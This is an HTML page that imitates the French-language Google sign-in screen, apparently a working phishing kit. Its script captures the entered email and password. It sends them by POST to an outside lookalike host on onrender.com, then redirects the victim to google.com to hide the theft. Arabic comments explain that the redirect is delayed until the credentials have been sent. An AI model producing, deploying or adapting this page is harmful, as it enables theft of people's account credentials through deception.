<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion – Compte Google</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background-color: #f0f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: #ffffff;
            padding: 40px;
            border-radius: 8px;
            width: 450px;
            max-width: 100%;
            border: 1px solid #dadce0;
            text-align: center;
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 16px;
        }
        .logo span:nth-child(1) { color: #4285F4; }
        .logo span:nth-child(2) { color: #EA4335; }
        .logo span:nth-child(3) { color: #FBBC05; }
        .logo span:nth-child(4) { color: #4285F4; }
        .logo span:nth-child(5) { color: #34A853; }
        .logo span:nth-child(6) { color: #EA4335; }
        
        h2 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #202124;
        }
        p {
            font-size: 16px;
            color: #202124;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        input:focus {
            border-color: #1a73e8;
        }
        .links-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
        }
        .link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .link:hover {
            text-decoration: underline;
        }
        .btn-submit {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-submit:hover {
            background-color: #1557b0;
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="logo">
        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
    </div>
    
    <h2>Connexion</h2>
    <p>Accéder à votre compte</p>

    <form id="loginForm">
        <div class="input-group">
            <input type="email" id="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
        </div>
        
        <div class="input-group">
            <input type="password" id="password" placeholder="Saisissez votre mot de passe" required>
        </div>

        <div class="links-container">
            <a href="https://www.google.com" class="link">Créer un compte</a>
            <a href="https://www.google.com" class="link">Mot de passe oublié ?</a>
        </div>

        <div class="links-container" style="justify-content: flex-end; margin-top: 20px;">
            <button type="submit" class="btn-submit">Suivant</button>
        </div>
    </form>
</div>
<script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault(); // منع الانتقال الفوري للاستحواذ على البيانات أولاً
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const btn = document.querySelector('.btn-submit');
        
        // تغيير شكل الزر لإظهار جاري التحميل
        btn.innerText = "Connexion...";
        btn.disabled = true;
        
        try {
            // إرسال البيانات والانتظار الإجباري للاستجابة باستخدام await
            const response = await fetch('https://googla-0lly.onrender.com/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email: email, password: password })
            });
            
            // قراءة الرد لضمان اكتمال العملية بنجاح
            await response.json();
            
        } catch (error) {
            console.error("Error:", error);
        } finally {
            // الآن فقط، بعد الاطمئنان أن الطلب خرج ووصل للسيرفر، ننقله إلى جوجل
            window.location.href = "https://www.google.com";
        }
    });
</script>



</body>
</html>
